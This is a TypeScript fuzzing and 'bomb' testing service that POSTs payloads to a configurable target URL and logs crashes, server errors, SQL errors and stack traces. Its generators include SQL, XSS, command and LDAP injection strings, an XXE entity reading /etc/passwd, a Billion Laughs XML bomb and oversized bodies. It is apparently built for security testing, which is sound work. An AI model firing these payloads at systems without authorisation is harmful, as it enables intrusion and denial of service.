/**
 * Fuzzing and Bomb Testing Service
 * 
 * Implements various fuzzing strategies and bomb attacks for security testing:
 * - String fuzzing (special characters, encoding, overflow)
 * - Number fuzzing (boundary values, overflow, underflow)
 * - Format fuzzing (malformed data, invalid types)
 * - Injection fuzzing (SQL, XSS, command injection)
 * - Bomb testing (ZIP bomb, XML bomb, Billion Laughs)
 */

import axios, { AxiosRequestConfig } from 'axios';
import * as crypto from 'crypto';

export interface FuzzingOptions {
  targetUrl: string;
  method?: string;
  headers?: Record<string, string>;
  basePayload?: any;
  fuzzingType: FuzzingType;
  intensity?: 'low' | 'medium' | 'high';
  maxRequests?: number;
  delayMs?: number;
}

export type FuzzingType = 
  | 'string' | 'number' | 'format' | 'injection' 
  | 'boundary' | 'encoding' | 'bomb' | 'all';

export interface FuzzingResult {
  testId: string;
  timestamp: Date;
  targetUrl: string;
  fuzzingType: FuzzingType;
  totalTests: number;
  duration: number;
  findings: FuzzingFinding[];
  summary: {
    crashes: number;
    errors: number;
    timeouts: number;
    anomalies: number;
  };
}

export interface FuzzingFinding {
  id: string;
  testCase: string;
  payload: any;
  severity: 'critical' | 'high' | 'medium' | 'low';
  type: 'crash' | 'error' | 'timeout' | 'anomaly' | 'injection';
  request: string;
  response?: {
    status: number;
    data: string;
    time: number;
  };
  description: string;
}

export class FuzzingService {
  private testId: string = '';
  private findings: FuzzingFinding[] = [];
  private startTime: number = 0;
  private requestCount: number = 0;

  /**
   * Run fuzzing tests
   */
  async runFuzzing(options: FuzzingOptions): Promise<FuzzingResult> {
    this.testId = this.generateTestId();
    this.findings = [];
    this.startTime = Date.now();
    this.requestCount = 0;

    const maxRequests = options.maxRequests || this.getMaxRequests(options.intensity || 'medium');
    const delayMs = options.delayMs || 0;

    if (options.fuzzingType === 'all') {
      await this.runAllFuzzingTypes(options, maxRequests, delayMs);
    } else {
      await this.runSpecificFuzzing(options, maxRequests, delayMs);
    }

    const duration = Date.now() - this.startTime;

    return {
      testId: this.testId,
      timestamp: new Date(),
      targetUrl: options.targetUrl,
      fuzzingType: options.fuzzingType,
      totalTests: this.requestCount,
      duration,
      findings: this.findings,
      summary: this.generateSummary(),
    };
  }

  /**
   * Run all fuzzing types
   */
  private async runAllFuzzingTypes(
    options: FuzzingOptions,
    maxRequests: number,
    delayMs: number
  ): Promise<void> {
    const types: FuzzingType[] = ['string', 'number', 'format', 'injection', 'boundary', 'encoding'];
    const requestsPerType = Math.floor(maxRequests / types.length);

    for (const type of types) {
      await this.runSpecificFuzzing(
        { ...options, fuzzingType: type },
        requestsPerType,
        delayMs
      );
    }
  }

  /**
   * Run specific fuzzing type
   */
  private async runSpecificFuzzing(
    options: FuzzingOptions,
    maxRequests: number,
    delayMs: number
  ): Promise<void> {
    let payloads: any[] = [];

    switch (options.fuzzingType) {
      case 'string':
        payloads = this.generateStringFuzzPayloads();
        break;
      case 'number':
        payloads = this.generateNumberFuzzPayloads();
        break;
      case 'format':
        payloads = this.generateFormatFuzzPayloads();
        break;
      case 'injection':
        payloads = this.generateInjectionFuzzPayloads();
        break;
      case 'boundary':
        payloads = this.generateBoundaryFuzzPayloads();
        break;
      case 'encoding':
        payloads = this.generateEncodingFuzzPayloads();
        break;
      case 'bomb':
        payloads = this.generateBombPayloads();
        break;
    }

    // Limit payloads to maxRequests
    payloads = payloads.slice(0, maxRequests);

    for (const payload of payloads) {
      await this.testPayload(options, payload, options.fuzzingType);
      this.requestCount++;

      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  }

  /**
   * Test a single payload
   */
  private async testPayload(
    options: FuzzingOptions,
    payload: any,
    type: FuzzingType
  ): Promise<void> {
    const startTime = Date.now();

    try {
      const config: AxiosRequestConfig = {
        method: options.method || 'POST',
        url: options.targetUrl,
        headers: options.headers,
        data: payload,
        timeout: 10000,
        validateStatus: () => true,
      };

      const response = await axios(config);
      const responseTime = Date.now() - startTime;

      // Analyze response for anomalies
      this.analyzeResponse(response, payload, type, responseTime);

    } catch (error: any) {
      const responseTime = Date.now() - startTime;

      if (error.code === 'ECONNABORTED') {
        // Timeout
        this.addFinding({
          testCase: `Timeout with ${type} fuzzing`,
          payload,
          severity: 'medium',
          type: 'timeout',
          request: options.targetUrl,
          description: 'Request timed out - possible DoS vulnerability',
        });
      } else if (error.code === 'ECONNREFUSED' || error.code === 'ECONNRESET') {
        // Crash
        this.addFinding({
          testCase: `Server crash with ${type} fuzzing`,
          payload,
          severity: 'critical',
          type: 'crash',
          request: options.targetUrl,
          description: 'Server connection refused or reset - possible crash',
        });
      } else {
        // Error
        this.addFinding({
          testCase: `Error with ${type} fuzzing`,
          payload,
          severity: 'medium',
          type: 'error',
          request: options.targetUrl,
          description: error.message,
        });
      }
    }
  }

  /**
   * Analyze response for anomalies
   */
  private analyzeResponse(
    response: any,
    payload: any,
    type: FuzzingType,
    responseTime: number
  ): void {
    // Check for error status codes
    if (response.status >= 500) {
      this.addFinding({
        testCase: `Server error with ${type} fuzzing`,
        payload,
        severity: 'high',
        type: 'error',
        request: response.config.url,
        response: {
          status: response.status,
          data: response.data?.substring(0, 500),
          time: responseTime,
        },
        description: `Server returned ${response.status} error`,
      });
    }

    // Check for SQL errors
    if (this.detectSQLError(response.data)) {
      this.addFinding({
        testCase: `SQL injection with ${type} fuzzing`,
        payload,
        severity: 'critical',
        type: 'injection',
        request: response.config.url,
        response: {
          status: response.status,
          data: response.data?.substring(0, 500),
          time: responseTime,
        },
        description: 'SQL error detected in response',
      });
    }

    // Check for stack traces
    if (this.detectStackTrace(response.data)) {
      this.addFinding({
        testCase: `Stack trace exposure with ${type} fuzzing`,
        payload,
        severity: 'medium',
        type: 'anomaly',
        request: response.config.url,
        response: {
          status: response.status,
          data: response.data?.substring(0, 500),
          time: responseTime,
        },
        description: 'Stack trace exposed in response',
      });
    }

    // Check for slow responses (potential DoS)
    if (responseTime > 5000) {
      this.addFinding({
        testCase: `Slow response with ${type} fuzzing`,
        payload,
        severity: 'low',
        type: 'anomaly',
        request: response.config.url,
        response: {
          status: response.status,
          data: 'Response too large to display',
          time: responseTime,
        },
        description: `Response took ${responseTime}ms - potential DoS vulnerability`,
      });
    }
  }

  // ==================== Payload Generators ====================

  /**
   * Generate string fuzzing payloads
   */
  private generateStringFuzzPayloads(): any[] {
    return [
      // Special characters
      { test: "!@#$%^&*()_+-=[]{}|;':\",./<>?" },
      { test: '\\x00\\x01\\x02\\x03\\x04\\x05' },
      
      // Long strings
      { test: 'A'.repeat(1000) },
      { test: 'A'.repeat(10000) },
      { test: 'A'.repeat(100000) },
      
      // Unicode and encoding
      { test: '你好世界🌍' },
      { test: '\u0000\u0001\u0002' },
      { test: '%00%01%02' },
      
      // Format strings
      { test: '%s%s%s%s%s%s%s%s%s%s' },
      { test: '%x%x%x%x%x%x%x%x%x%x' },
      { test: '%n%n%n%n%n%n%n%n%n%n' },
      
      // Null and empty
      { test: null },
      { test: '' },
      { test: ' ' },
      { test: '\n\r\t' },
    ];
  }

  /**
   * Generate number fuzzing payloads
   */
  private generateNumberFuzzPayloads(): any[] {
    return [
      // Boundary values
      { value: 0 },
      { value: -1 },
      { value: 1 },
      { value: 2147483647 }, // Max int32
      { value: -2147483648 }, // Min int32
      { value: 9007199254740991 }, // Max safe integer
      { value: -9007199254740991 }, // Min safe integer
      
      // Overflow
      { value: 999999999999999999999 },
      { value: -999999999999999999999 },
      
      // Special numbers
      { value: NaN },
      { value: Infinity },
      { value: -Infinity },
      
      // Decimal edge cases
      { value: 0.1 + 0.2 }, // Floating point precision
      { value: 1e308 }, // Near max double
      { value: 1e-308 }, // Near min double
    ];
  }

  /**
   * Generate format fuzzing payloads
   */
  private generateFormatFuzzPayloads(): any[] {
    return [
      // Type confusion
      { data: 'string' },
      { data: 123 },
      { data: true },
      { data: null },
      { data: undefined },
      { data: [] },
      { data: {} },
      
      // Malformed JSON
      '{"unclosed": "object"',
      '{"key": }',
      '{key: "no quotes"}',
      '{"trailing": "comma",}',
      
      // Malformed XML
      '<root><unclosed>',
      '<root></wrong>',
      '<root attr="unclosed>',
      
      // Circular references
      (() => { const obj: any = {}; obj.self = obj; return obj; })(),
    ];
  }

  /**
   * Generate injection fuzzing payloads
   */
  private generateInjectionFuzzPayloads(): any[] {
    return [
      // SQL injection
      { input: "' OR '1'='1" },
      { input: "'; DROP TABLE users--" },
      { input: "1' UNION SELECT NULL--" },
      
      // XSS
      { input: '<script>alert(1)</script>' },
      { input: '<img src=x onerror=alert(1)>' },
      { input: 'javascript:alert(1)' },
      
      // Command injection
      { input: '; ls -la' },
      { input: '| whoami' },
      { input: '`id`' },
      { input: '$(whoami)' },
      
      // LDAP injection
      { input: '*)(uid=*))(|(uid=*' },
      { input: 'admin)(&(password=*)' },
      
      // XML injection
      { input: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
    ];
  }

  /**
   * Generate boundary fuzzing payloads
   */
  private generateBoundaryFuzzPayloads(): any[] {
    return [
      // Array boundaries
      { items: [] },
      { items: [1] },
      { items: Array(1000).fill(0) },
      { items: Array(10000).fill(0) },
      
      // String boundaries
      { text: '' },
      { text: 'a' },
      { text: 'a'.repeat(255) },
      { text: 'a'.repeat(256) },
      { text: 'a'.repeat(65535) },
      { text: 'a'.repeat(65536) },
      
      // Negative indices
      { index: -1 },
      { index: -999999 },
    ];
  }

  /**
   * Generate encoding fuzzing payloads
   */
  private generateEncodingFuzzPayloads(): any[] {
    return [
      // URL encoding
      { data: '%00%01%02%03' },
      { data: '%2e%2e%2f%2e%2e%2f' },
      { data: '%252e%252e%252f' }, // Double encoding
      
      // HTML encoding
      { data: '&lt;script&gt;alert(1)&lt;/script&gt;' },
      { data: '&#60;script&#62;alert(1)&#60;/script&#62;' },
      
      // Base64
      { data: Buffer.from('test').toString('base64') },
      { data: Buffer.from('<script>alert(1)</script>').toString('base64') },
      
      // Unicode normalization
      { data: '\u00e9' }, // é (composed)
      { data: 'e\u0301' }, // é (decomposed)
    ];
  }

  /**
   * Generate bomb payloads
   */
  private generateBombPayloads(): any[] {
    return [
      // Billion Laughs (XML bomb)
      {
        xml: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`
      },
      
      // JSON bomb (deeply nested)
      this.generateDeepNestedJSON(100),
      
      // Large payload
      { data: 'A'.repeat(10 * 1024 * 1024) }, // 10MB
      
      // Many keys
      this.generateManyKeys(10000),
    ];
  }

  /**
   * Generate deeply nested JSON
   */
  private generateDeepNestedJSON(depth: number): any {
    let obj: any = { value: 'end' };
    for (let i = 0; i < depth; i++) {
      obj = { nested: obj };
    }
    return obj;
  }

  /**
   * Generate object with many keys
   */
  private generateManyKeys(count: number): any {
    const obj: any = {};
    for (let i = 0; i < count; i++) {
      obj[`key${i}`] = `value${i}`;
    }
    return obj;
  }

  // ==================== Detection Helpers ====================

  private detectSQLError(data: string): boolean {
    if (!data) return false;
    const patterns = [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_/i,
      /PostgreSQL.*ERROR/i,
      /ORA-\d+/i,
      /SQLServer JDBC Driver/i,
    ];
    return patterns.some(pattern => pattern.test(data));
  }

  private detectStackTrace(data: string): boolean {
    if (!data) return false;
    return /at\s+[\w.]+\s*\([^)]+:\d+:\d+\)/i.test(data) ||
           /Traceback \(most recent call last\)/i.test(data) ||
           /Exception in thread/i.test(data);
  }

  // ==================== Utility Methods ====================

  private getMaxRequests(intensity: string): number {
    switch (intensity) {
      case 'low': return 50;
      case 'medium': return 200;
      case 'high': return 500;
      default: return 200;
    }
  }

  private addFinding(finding: Omit<FuzzingFinding, 'id'>): void {
    this.findings.push({
      id: this.generateFindingId(),
      ...finding,
    });
  }

  private generateTestId(): string {
    return `fuzz-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  private generateFindingId(): string {
    return `finding-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  private generateSummary() {
    const summary = {
      crashes: 0,
      errors: 0,
      timeouts: 0,
      anomalies: 0,
    };

    for (const finding of this.findings) {
      if (finding.type === 'crash') summary.crashes++;
      else if (finding.type === 'error') summary.errors++;
      else if (finding.type === 'timeout') summary.timeouts++;
      else if (finding.type === 'anomaly') summary.anomalies++;
    }

    return summary;
  }
}

// Singleton instance
let fuzzingInstance: FuzzingService | null = null;

export function getFuzzingService(): FuzzingService {
  if (!fuzzingInstance) {
    fuzzingInstance = new FuzzingService();
  }
  return fuzzingInstance;
}
